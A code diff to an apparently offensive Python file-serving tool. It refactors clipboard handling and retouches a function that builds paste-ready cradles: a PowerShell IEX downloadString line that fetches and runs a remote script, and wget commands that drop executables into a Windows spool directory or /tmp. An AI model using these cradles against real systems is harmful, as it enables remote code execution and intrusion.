@@ -25,6 +25,8 @@ from functools import partial
 from http import HTTPStatus
 from urllib.parse import urlparse, parse_qs
 
+import pyperclip
+import urllib3
 from binaryornot.check import is_binary
 
 from core.config import eval_index, get_index, eval_bind
@@ -34,9 +36,8 @@ from core.log import log_normal, set_global_verbose, log_verbose, YELLOW, NO_COL
 from core.ssl_util import cert_gen
 from core.util import get_available_port, is_b64, get_external_ip
 
-
-import urllib3
 urllib3.disable_warnings()
+
 
 # Default error message template
 
@@ -578,8 +579,8 @@ class CORSRequestHandler(SimpleHTTPRequestHandler):
 
 
 def copy(text):
-    command = 'echo \'' + text.strip() + '\' | xclip -r -sel clip'
-    os.system(command)
+    pyperclip.copy(text)
+    pyperclip.paste()
 
 
 def check_copy(index, address):
@@ -588,7 +589,7 @@ def check_copy(index, address):
     elif index.endswith(".ps1"):
         copy_str = f'IEX(New-Object Net.Webclient).downloadString("{address}")'
     elif index.endswith(".exe") or index.endswith("msi"):
-        copy_str = f"powershell -c \"wget {address} -O \Windows\system32\spool\drivers\color\{os.path.basename(index)}\""
+        copy_str = f"wget {address} -O \Windows\system32\spool\drivers\color\{os.path.basename(index)}"
     else:
         copy_str = f"wget {address} -O /tmp/{os.path.basename(index)}"
 
